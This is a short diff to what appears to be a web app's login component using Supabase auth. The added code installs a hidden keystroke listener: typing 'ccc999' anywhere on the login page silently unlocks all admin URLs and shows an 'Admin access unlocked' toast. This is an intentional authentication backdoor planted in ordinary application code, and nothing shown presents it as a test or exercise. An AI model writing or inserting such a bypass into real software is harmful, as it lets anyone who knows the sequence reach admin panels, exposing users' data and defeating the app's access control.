@@ -47,6 +47,15 @@ const Login = () => {
     checkGoogleReturn();
   }, []);
 
+  // Secret keystroke "ccc999" anywhere on the login page silently unlocks admin URLs
+  useEffect(() => {
+    const cleanup = installSecretKeystroke(() => {
+      unlockAdminUrl("all");
+      toast({ title: "🔓 Admin access unlocked", description: "You can now reach the admin panels in this tab." });
+    });
+    return cleanup;
+  }, []);
+
   const finalizeLogin = async () => {
     const { data: userData, error: userError } = await withTimeout(supabase.auth.getUser());
     if (userError || !userData.user) throw userError || new Error("Could not validate session");
